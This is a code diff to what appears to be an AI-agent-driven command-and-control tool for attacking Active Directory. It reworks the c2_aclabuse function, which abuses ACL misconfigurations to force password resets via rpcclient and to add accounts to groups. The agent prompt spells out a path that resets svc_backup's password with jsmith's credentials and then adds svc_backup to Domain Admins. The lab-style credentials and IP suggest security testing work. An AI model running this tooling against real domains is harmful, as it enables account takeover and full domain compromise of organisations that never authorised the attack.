@@ -459,7 +459,7 @@ def c2_spray(agent_id: str, target_ip: str) -> str:
 
 
 @tool
-def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str = "", altpass: str = "", dc_ip: str = "") -> str:
+def c2_aclabuse(agent_id: str, operation: str, operation_args: list, altuser: str = "", altpass: str = "", dc_ip: str = "") -> str:
     """
     Exploit an ACL misconfiguration.
     operation choices:
@@ -468,10 +468,13 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
       genericwrite        <target> <attribute> <value>
       writedacl           <target> <principal> <right>
       writeowner          <target> <new_owner>
-    operation_args: positional arguments as a space-separated string.
+    operation_args: list of positional arguments — one element per arg, supports multi-word names.
+      IMPORTANT: each argument must be its own list element. Never split a name with spaces into
+      multiple elements. E.g. ["Domain Admins", "SVC_BACKUP"] not ["Domain", "Admins", "SVC_BACKUP"].
     altuser/altpass: credentials of the account that holds the ACL right (required for forcechangepassword).
     dc_ip: DC IP address (optional — skips hosts DB lookup; always provide this when known).
-    Example: operation='forcechangepassword', operation_args='svc_backup NewP@ss!', altuser='helpdesk', altpass='PfeLab@2026!', dc_ip='10.0.2.8'
+    Example: operation='addmember', operation_args=['Domain Admins', 'SVC_BACKUP'], altuser='SVC_BACKUP', altpass='NewP@ss!', dc_ip='10.0.2.8'
+    Example: operation='forcechangepassword', operation_args=['svc_backup', 'NewP@ss!'], altuser='helpdesk', altpass='PfeLab@2026!', dc_ip='10.0.2.8'
     Blocks up to 60 seconds.
     """
     import subprocess as _sp
@@ -484,9 +487,9 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
         # ADSI SetPassword uses wrong SAMR level — run via rpcclient server-side instead.
         if not altuser or not altpass:
             return "[error] forcechangepassword requires altuser and altpass (account with ForceChangePassword/GenericAll right)"
-        args = operation_args.split()
+        args = list(operation_args)
         if len(args) < 2:
-            return "[error] forcechangepassword: operation_args must be '<user> <newpassword>'"
+            return "[error] forcechangepassword: operation_args must be ['<user>', '<newpassword>']"
         target_user, newpass = args[0], args[1]
         resolved_dc = dc_ip.strip() if dc_ip.strip() else None
         if not resolved_dc:
@@ -517,7 +520,7 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
         except Exception as e:
             return f"[error] rpcclient: {e}"
 
-    instruction = op + "|" + "|".join(operation_args.split())
+    instruction = op + "|" + "|".join(str(a) for a in operation_args)
     if altuser and altpass:
         instruction += f"|{altuser}|{altpass}"
     res = _post("/task", {"agent_id": agent_id, "task_type": "aclabuse", "instruction": instruction})
@@ -735,9 +738,9 @@ Execute BOTH paths A and B whenever matches are found:
     Example path: "jsmith --[ForceChangePassword]--> svc_backup --[AddMember]--> Domain Admins"
     And you have jsmith credentials:
       Step 1: c2_ask_human("Ready to ForceChangePassword on svc_backup using jsmith. Proceed?")
-              c2_aclabuse(agent_id, "forcechangepassword", "svc_backup NewP@ssw0rd!", altuser="jsmith", altpass="<pass>", dc_ip="<dc_ip>")
+              c2_aclabuse(agent_id, "forcechangepassword", ["svc_backup", "NewP@ssw0rd!"], altuser="jsmith", altpass="<pass>", dc_ip="<dc_ip>")
       Step 2: c2_ask_human("Ready to AddMember: add svc_backup to Domain Admins. Proceed?")
-              c2_aclabuse(agent_id, "addmember", "Domain Admins svc_backup", dc_ip="<dc_ip>")
+              c2_aclabuse(agent_id, "addmember", ["Domain Admins", "svc_backup"], altuser="svc_backup", altpass="NewP@ssw0rd!", dc_ip="<dc_ip>")
 
     IMPORTANT: Always pass dc_ip to c2_aclabuse when the DC IP is known. Never skip it — the hosts DB
     may be empty and dc_ip is the only reliable way to reach the DC. If the operator told you the DC IP,
